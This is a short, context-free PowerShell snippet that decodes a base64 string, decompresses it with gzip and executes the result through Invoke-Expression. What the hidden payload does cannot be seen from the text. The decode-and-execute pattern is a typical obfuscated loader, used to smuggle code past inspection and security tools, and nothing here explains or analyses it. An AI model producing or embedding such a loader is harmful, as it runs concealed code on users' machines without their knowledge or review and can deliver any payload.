
$data = "H4sIAEZLImkC/+NSAAKV5JzM1LwSBVsFv9RyXf+krNTkEoXgyuKS1Fw9v9QSvfDUJGewCi6w6tKiHKBSpYySkgIrfX1DAz0QNNIvLklMTy3SKyg2VAKr83SNgJms55JfnpeTn5gSXFKUmZeuATJCE6wIAAhWY5iAAAAA"
$bytes = [System.Convert]::FromBase64String($data)
$ms = New-Object System.IO.MemoryStream(,$bytes)
$gs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$sr = New-Object System.IO.StreamReader($gs)
$decoded = $sr.ReadToEnd()
IEX $decoded
